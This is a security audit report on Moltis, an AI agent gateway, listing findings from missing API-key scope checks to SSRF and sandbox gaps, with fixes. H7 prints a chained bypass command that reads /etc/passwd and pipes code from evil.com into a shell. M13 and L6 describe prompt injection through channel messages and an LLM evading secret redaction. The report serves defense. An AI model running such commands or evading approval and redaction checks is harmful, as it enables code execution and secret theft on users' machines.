# Moltis Security Audit Report

**Date:** 2026-02-13
**Commit:** `2e266a1` (branch `main`)
**Scope:** Deep dive -- threat model, attack surface, code review, penetration testing, dependency/supply chain analysis
**Method:** Parallel multi-agent audit (4 specialized security agents)

---

## Threat Model Context

Moltis is primarily a **local-first developer tool** -- a personal AI agent gateway that typically runs on the developer's own machine. Many findings have different severity profiles depending on deployment context:

- **Local-only** (default): Filesystem access implies full trust; plaintext secrets on disk are standard practice (comparable to `~/.aws/credentials`, `~/.kube/config`).
- **Deployed as a service** (Docker, cloud): All findings at face value; encryption at rest and strict auth become critical.

Severity ratings in this report assume the **deployed-as-a-service** context (worst case). For local-only use, H5 (data sovereignty) and H6 (encryption at rest) drop to Medium.

---

## Executive Summary

Moltis demonstrates a **mature security posture** with strong fundamentals: comprehensive SSRF protection, CSWSH mitigation, Argon2 password hashing, WebAuthn passkeys, `secrecy::Secret<String>` throughout, CSP with per-request nonces, SHA-pinned CI actions, Sigstore signing, and `unsafe_code = "deny"` at the workspace level.

However, the audit identified **1 critical, 7 high, 16 medium, and 13 low** findings across authentication, sandbox isolation, supply chain, and data protection domains. The single critical finding -- API key scopes defined but never enforced -- means every API key has full admin access regardless of assigned permissions.

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 7 |
| Medium | 16 |
| Low | 13 |

---

## Critical Findings

### C1: API Key Scopes Never Enforced

- **Files:** `crates/gateway/src/state.rs:126` (`has_scope()` defined), `crates/gateway/src/ws.rs:200-231` (scopes assigned but not checked)
- **CWE:** CWE-862 (Missing Authorization)
- **OWASP:** A01:2021 -- Broken Access Control

`has_scope()` is defined on `ConnectedClient` and scopes are stored during API key creation, but **zero call sites** exist in the entire codebase. API keys with empty scopes are correctly rejected at connection time, but non-empty scopes are never checked at RPC dispatch -- an API key with `operator.read` has identical access to one with `operator.admin`. The UI lets users create scoped keys, giving a false sense of least-privilege.

**Impact:** Any API key grants full administrative access -- config changes, credential management, command execution, identity modification.

**Remediation:** Add `require_scope(scope)` checks at every RPC method handler and REST endpoint. Create a macro or middleware for consistent enforcement.

---

## High Findings

### H1: SSRF DNS Rebinding (TOCTOU)

- **File:** `crates/tools/src/web_fetch.rs:98-107`
- **CWE:** CWE-367 (Time-of-check Time-of-use)

`ssrf_check()` resolves DNS via `tokio::net::lookup_host()`, then `reqwest` performs its own independent DNS resolution in `.send()`. An attacker controlling a DNS record with short TTL can pass the check with a public IP, then have reqwest connect to `127.0.0.1`.

**Remediation:** Pin resolved IPs via `reqwest::Client::builder().resolve()` so the connection uses the same addresses that passed the SSRF check.

### H2: IPv6-Mapped IPv4 SSRF Bypass

- **File:** `crates/tools/src/web_fetch.rs:221-229`
- **CWE:** CWE-918 (Server-Side Request Forgery)

`is_private_ip()` checks IPv6 loopback (`::1`) and ULA/link-local, but NOT IPv4-mapped IPv6 addresses like `::ffff:127.0.0.1`. Rust's `Ipv6Addr::is_loopback()` only returns true for `::1`, not for mapped addresses.

**Remediation:** Add: `v6.to_ipv4_mapped().is_some_and(|v4| is_private_ip(&IpAddr::V4(v4)))`.

### H3: Docker Containers Lack Security Hardening

- **File:** `crates/tools/src/sandbox.rs:801-821`
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)

Docker `run` command includes no hardening flags: no `--cap-drop=ALL`, no `--security-opt=no-new-privileges`, no `--user`, no `--read-only`. Containers run as root with full default capabilities.

**Remediation:** Add `--cap-drop=ALL --security-opt no-new-privileges:true --user 1000:1000 --read-only --tmpfs /tmp:rw,noexec,nosuid`.

### H4: No `cargo-deny` for Dependency Vulnerability Scanning

- **CWE:** CWE-1104 (Use of Unmaintained Third-Party Components)
- **OWASP:** A06:2021 -- Vulnerable and Outdated Components

No `deny.toml` exists. No `cargo-deny`, `cargo-audit`, or dependency review step in CI. Known CVEs in transitive dependencies go undetected.

**Remediation:** Create `deny.toml` with advisories (deny), licenses (allow MIT/Apache-2.0/BSD), bans (warn on duplicates). Add `cargo deny check` to CI.

### H5: Data Sovereignty -- Chinese Providers Active by Default

- **Files:** `crates/gateway/src/provider_setup.rs:498-506` (MiniMax, Moonshot), `crates/config/src/template.rs:86` (moonshot in default `offered`)
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

MiniMax (`api.minimax.chat`), Moonshot (`api.moonshot.cn`), and Kimi Code (`api.kimi.com`) route user conversations through Chinese-jurisdiction infrastructure. Moonshot is in the default onboarding offered list.

**Remediation:** Remove `moonshot` from default offered list. Add data sovereignty warnings when Chinese providers are selected. Implement audit logging for provider selection.

### H6: No Encryption at Rest for Secrets

- **Files:** `crates/gateway/src/auth.rs:476` (env_variables), `crates/gateway/src/provider_setup.rs` (provider_keys.json), `crates/oauth/src/storage.rs` (oauth_tokens.json)
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

API keys, OAuth tokens, and environment variables are stored as plaintext in SQLite and JSON files. Only Unix file permissions (0600) protect them.

**Remediation:** Encrypt sensitive fields using AES-256-GCM with a key derived from the user's password. For JSON files, encrypt individual secret values or the entire file.

### H7: Command Approval Bypass via Shell Chaining

- **File:** `crates/tools/src/approval.rs:136-156`
- **CWE:** CWE-78 (Improper Neutralization of Special Elements in OS Commands)

`extract_first_bin` only inspects the first command in a pipeline. `cat /etc/passwd && curl evil.com | sh` passes approval as "cat" (safe bin). Shell operators (`;`, `&&`, `||`, `|`, backticks, `$()`) are not parsed.

**Remediation:** Parse for shell operators. If any chaining/piping detected, require full approval regardless of the first binary.

---

## Medium Findings

### M1: Session Cookie Missing `Secure` Flag
- **File:** `crates/gateway/src/auth_routes.rs:448`
- Cookie set with `HttpOnly; SameSite=Strict` but never `Secure`, even when TLS is active.
- **Fix:** Conditionally add `; Secure` when TLS is enabled or behind proxy.

### M2: XSS via `innerHTML` with Server Data
- **File:** `crates/gateway/src/assets/js/providers.js:817,1002,1082,1089,1093`
- Server-returned data (backend notes, error messages, model names) injected via `innerHTML` without HTML escaping.
- **Fix:** Use `textContent` for dynamic data or apply the existing `esc()` helper.

### M3: Setup Code Logged in Plaintext
- **File:** `crates/gateway/src/auth_routes.rs:247`
- By design for terminal display, but problematic when logs ship to centralized systems.
- **Fix:** Mask in structured logging; print plaintext only to stdout.

### M4: Env Variables Exposed in Docker Exec Process Arguments
- **File:** `crates/tools/src/sandbox.rs:915-917`
- Secrets passed as `-e KEY=VALUE` command-line args, visible in `ps aux` on the host.
- **Fix:** Use `--env-file` with a temp file instead.

### M5: Sandbox Network Access Default Enabled
- **File:** `crates/tools/src/sandbox.rs:808` -- `no_network` defaults to `false`.
- **Fix:** Default `no_network: true`, require opt-in.

### M6: Workspace Mount Exposes Host Filesystem
- Mounts `~/.moltis/` into container, exposing credentials and database.
- **Fix:** Mount only the specific project directory, not the data directory.

### M7: Prometheus `/metrics` Endpoint Unauthenticated
- **File:** `crates/gateway/src/server.rs:771`
- Gated behind `#[cfg(feature = "prometheus")]` (opt-in), but when enabled exposes operational metrics to any network-adjacent attacker.
- **Fix:** Add config option to restrict to localhost or require auth.

### M8: Authenticated Users Bypass All Rate Limits
- **File:** `crates/gateway/src/request_throttle.rs:233-244`
- Compromised API key can issue unlimited requests.
- **Fix:** Apply separate (higher) rate limits for authenticated users.

### M9: Docker Container Passwordless sudo
- **File:** `Dockerfile:51` -- `moltis ALL=(ALL) NOPASSWD:ALL`
- **Fix:** Restrict to specific commands or remove sudo entirely.

### M10: Non-Workspace Dependency Versions
- **Files:** `crates/browser/Cargo.toml`, `crates/voice/Cargo.toml`
- Several crates specify versions inline instead of `{ workspace = true }`. Active version mismatch: `crates/voice/Cargo.toml` pins `which = "7"` while workspace has `which = "8"`, pulling two different versions.
- **Fix:** Convert all to `{ workspace = true }`. Add `chromiumoxide` to workspace dependencies.

### M11: `webauthn-rs` `danger-allow-state-serialisation` Feature
- **File:** `crates/gateway/Cargo.toml:74`
- Allows deserialization of WebAuthn state, potential replay attack vector.
- **Fix:** Verify state has short TTL and integrity protection; document justification.

### M12: Dockerfile Base Images Not Pinned by Digest
- **File:** `Dockerfile:14,31` -- `FROM rust:bookworm`, `FROM debian:bookworm-slim`
- Mutable tags can be overwritten upstream.
- **Fix:** Pin by `@sha256:<digest>`.

### M13: Channel Messages Can Prompt-Inject LLM
- Telegram messages from allowlisted users go directly to LLM context. Approval bypassed when sandboxed. Risk is compounded by H3 (sandbox lacks hardening) and H7 (approval bypass via shell chaining) -- if both are exploited together, prompt injection from a channel message could achieve arbitrary code execution with elevated container privileges.
- **Fix:** Add command deny-list for dangerous patterns (e.g., `curl | sh`, `rm -rf /`, reverse shells) even in sandboxed mode. Consider per-channel tool restrictions.

### M14: Shell Hooks Execute Arbitrary Config Commands
- **File:** `crates/plugins/src/shell_hook.rs:91-93`
- Config-driven command execution; config file modification = persistent backdoor.
- **Fix:** Validate hook commands; display confirmation in UI for new hooks.

### M15: No Security Audit Log
- Auth events, config changes, credential operations not in a queryable audit trail.
- **Fix:** Add `security_audit_log` table; log auth attempts, credential lifecycle, config changes.

### M16: WebSocket Message Rate Not Limited
- Authenticated WS clients can flood the server with messages.
- **Fix:** Add per-connection rate limiting (e.g., 60 messages/minute).

---

## Low Findings

| # | Finding | File | Notes |
|---|---------|------|-------|
| L1 | Setup code comparison not constant-time | `auth_routes.rs:144` | Mitigated by rate limiter; fix is trivial |
| L2 | No maximum password length | `auth_routes.rs:158` | DoS via large Argon2 input; add 1024 char max |
| L3 | VAPID private key file permissions | `push.rs:86` | Missing 0600 on `push.json` |
| L4 | OAuth token store race condition | `oauth/storage.rs:71-98` | Read-modify-write without file lock |
| L5 | Sandbox build pipes remote script | `sandbox.rs:872` | `curl | sh` for mise install |
| L6 | Secret redaction bypassable | `exec.rs:420-427` | LLM can use alternate encodings |
| L7 | `go install` module path unvalidated | `skills/requirements.rs` | Mitigated by trust gate |
| L8 | npm devDependencies use caret ranges | `gateway/ui/package.json` | lock file committed; low risk |
| L9 | mdBook CI download no checksum | `docs.yml:43-51` | Low privilege workflow |
| L10 | Self-hosted runner state persistence | `ci.yml:107` | Mitigated by container isolation |
| L11 | Auth fail-open when CredentialStore None | `auth_middleware.rs:103-106` | Edge case; unlikely in practice |
| L12 | Legacy env-var auth (MOLTIS_TOKEN) | `server.rs:847`, `auth.rs:679` | Plaintext, no session management |
| L13 | Config injection could disable auth | `config/schema.rs:860` | Requires file write access |

---

## Positive Security Controls

The audit confirmed these well-implemented controls:

| Control | Assessment |
|---------|------------|
| **SQL injection prevention** | All queries use `sqlx::query().bind()` -- no string interpolation |
| **Password hashing** | Argon2 with random salt, constant-time verification |
| **Session tokens** | 256-bit random (CSPRNG), base64url encoded, SHA-256 stored |
| **API key storage** | Only SHA-256 hashes persisted; raw key shown once |
| **Secret wrapping** | `secrecy::Secret<String>` throughout with `[REDACTED]` Debug impls |
| **SSRF protection** | DNS pre-resolution, private IP blocking (IPv4+IPv6), redirect re-validation |
| **CSWSH protection** | Origin validation with loopback normalization, port matching |
| **Rate limiting** | Per-IP with scoped windows (5/min login, 30/min WS, 180/min API) |
| **Security headers** | CSP (nonce), X-Content-Type-Options, X-Frame-Options: deny, Referrer-Policy |
| **CI supply chain** | All GitHub Actions SHA-pinned, `persist-credentials: false`, zizmor scanning |
| **Release integrity** | Sigstore keyless signing, SHA256/SHA512 checksums, CycloneDX + SPDX SBOMs |
| **Workspace lints** | `unsafe_code = "deny"`, `unwrap_used = "deny"`, `expect_used = "deny"` |
| **Archive path traversal** | Zip-slip protection with component validation, symlink rejection |
| **Skill trust lifecycle** | Install -> trust -> enable pipeline with provenance pinning |
| **npm postinstall blocked** | `--ignore-scripts` on all npm skill installs |
| **OAuth CSRF** | PKCE S256 with 256-bit verifier and 128-bit state parameter |
| **Password change invalidates sessions** | All sessions deleted on password change |

---

## Defense-in-Depth Scorecard

| Layer | Score | Key Gap |
|-------|-------|---------|
| Authentication | 7/10 | Missing `Secure` cookie flag; legacy env-var auth path |
| Authorization | **2/10** | **Scopes defined but never enforced** |
| Input Validation | 7/10 | Command chaining bypass; no WS message rate limit |
| Output Encoding | 8/10 | innerHTML XSS in providers.js |
| SSRF Protection | 8/10 | DNS rebinding TOCTOU; IPv6-mapped bypass |
| CSWSH Protection | 9/10 | Solid implementation |
| Encryption in Transit | 7/10 | TLS supported but cookie not marked Secure |
| Encryption at Rest | **2/10** | **All secrets plaintext on disk** |
| Rate Limiting | 7/10 | Authenticated users bypass entirely |
| Audit Logging | 4/10 | No dedicated security audit log |
| Sandbox Isolation | 6/10 | No capability dropping; network enabled by default |
| Supply Chain | 7/10 | No cargo-deny; Docker images not digest-pinned |
| Security Headers | 9/10 | Comprehensive CSP, HSTS via proxy |

---

## Remediation Priority Roadmap

### Immediate (Critical/High -- next sprint)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| C1 | Enforce API key scopes | 4-8h | Closes authorization gap |
| H1 | Fix SSRF DNS rebinding | 2h | Pin IPs in reqwest resolver |
| H2 | Add IPv6-mapped check | 30min | One-line fix |
| H3 | Harden Docker containers | 2h | Add security flags |
| H7 | Fix command approval bypass | 4h | Parse shell operators |
| H4 | Add cargo-deny | 2h | Dependency vulnerability scanning |

### Near-term (High/Medium -- next release)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| H6 | Encryption at rest | 8-16h | Protect secrets on disk |
| H5 | Data sovereignty controls | 4h | GDPR compliance |
| M1 | Secure cookie flag | 1h | Session hijacking prevention |
| M2 | Fix innerHTML XSS | 2h | Use textContent/esc() |
| M7 | Auth for /metrics | 2h | Information disclosure |
| M8 | Authenticated rate limits | 2h | DoS prevention |
| M9 | Remove Docker sudo | 1h | Privilege reduction |

### Backlog (Medium/Low)

| # | Finding | Effort |
|---|---------|--------|
| M5 | Default no_network in sandbox | 1h |
| M10 | Fix workspace dep versions | 1h |
| M12 | Pin Dockerfile by digest | 30min |
| M15 | Security audit log | 8h |
| M16 | WS message rate limiting | 4h |
| L1-L13 | Low-severity items | Various |

---

## STRIDE Threat Summary

| Category | Threats | Mitigated | Gaps |
|----------|---------|-----------|------|
| Spoofing | 5 | 3 | Secure cookie, legacy auth |
| Tampering | 5 | 2 | Plaintext secrets, MCP injection |
| Repudiation | 3 | 1 | No security audit log |
| Information Disclosure | 5 | 3 | Metrics endpoint, error messages |
| Denial of Service | 5 | 3 | Auth bypass of rate limits, WS flooding |
| Elevation of Privilege | 5 | 2 | **Scope non-enforcement**, command chaining |

---

## Binary Transparency Considerations

Compiled Rust binaries are opaque -- users cannot inspect them the way they can read source code. This raises the question: **is the binary itself a threat vector?**

### Current Mitigations

1. **Sigstore keyless signing** -- release binaries are signed with Sigstore, creating a verifiable link between the binary and the CI build that produced it.
2. **SBOMs** -- CycloneDX and SPDX Software Bills of Materials are published with each release, listing all compiled-in dependencies.
3. **SHA256/SHA512 checksums** -- published alongside each release artifact.
4. **Open source** -- users can build from source and compare behavior.
5. **Reproducible build inputs** -- `Cargo.lock` is committed, and CI uses `--locked` to ensure deterministic dependency resolution.

### Gaps

| Gap | Risk | Remediation |
|-----|------|-------------|
| **No reproducible builds** | Users cannot verify that a binary was built from a specific source commit | Implement reproducible builds (deterministic compilation) so anyone can rebuild from source and get the same binary hash |
| **No build provenance attestation** | Sigstore signs the binary but doesn't attest to the build environment/inputs (SLSA provenance) | Add SLSA provenance generation via `slsa-framework/slsa-github-generator` to produce a verifiable attestation chain from source to binary |
| **Embedded assets not auditable** | `include_dir!` embeds JS/CSS/HTML at compile time; the release binary's embedded assets may differ from the source tree | Publish a manifest of embedded asset hashes alongside each release; consider a `moltis verify-assets` command |
| **Vendored OpenSSL** | `openssl = { features = ["vendored"] }` compiles OpenSSL from source within the build -- the version/patches are controlled by the `openssl` crate, not directly auditable in the Moltis repo | Document the vendored OpenSSL version in release notes; consider switching to `rustls` (pure Rust TLS) to eliminate the C dependency |

### Recommendation

For maximum transparency, pursue **SLSA Level 3** build provenance:
1. Use `slsa-framework/slsa-github-generator` in the release workflow
2. Publish provenance attestations alongside each release
3. Document how users can verify provenance with `slsa-verifier`
4. Investigate reproducible builds as a longer-term goal

---

## Methodology

Four specialized security agents ran in parallel:

1. **Code Reviewer** -- Authentication, secrets handling, input validation, WebSocket, OAuth
2. **Penetration Tester** -- SSRF, sandbox escape, prompt injection, auth bypass, channel security
3. **Security Auditor** -- Dependencies, CI/CD, supply chain, configuration, compliance
4. **Architecture Reviewer** -- STRIDE threat model, attack surface map, trust boundaries, defense-in-depth

Findings were deduplicated, cross-referenced, and severity-normalized across all four reports.
